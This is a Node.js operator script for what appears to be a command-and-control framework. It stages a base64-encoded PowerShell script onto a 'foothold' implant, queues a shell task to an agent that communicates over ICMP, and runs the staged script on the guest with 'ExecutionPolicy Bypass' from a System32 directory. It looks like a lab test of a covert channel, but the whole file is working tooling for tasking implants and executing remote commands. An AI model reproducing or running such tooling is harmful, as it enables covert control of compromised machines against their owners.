// run-matrix6.mjs <footholdId> <icmpAgentId> — queue a fresh task to the live icmp
// agent (forcing channel replies on its pulls), then run the passive matrix6 listener
// on the guest as a direct task and print what transited, with direction.
const API = 'http://127.0.0.1:8971';
const [FOOTHOLD, ICMP] = [process.argv[2], process.argv[3]];
if (!FOOTHOLD || !ICMP) { console.error('usage: node run-matrix6.mjs <footholdId> <icmpAgentId>'); process.exit(2); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const { readFileSync } = await import('node:fs');

async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 60) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}

const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-matrix6.ps1', b64: readFileSync(new URL('./guest-icmp-matrix6.ps1', import.meta.url)).toString('base64') });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));
const t0 = await j('/api/channel/task', { agentId: ICMP, kind: 'shell', data: 'hostname' });
console.log('task queued to icmp agent:', t0.taskId);
const t = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\System32\\agentbox\\guest-icmp-matrix6.ps1' });
console.log('MATRIX6:', JSON.stringify(await waitTask(FOOTHOLD, t.taskId, 70)));
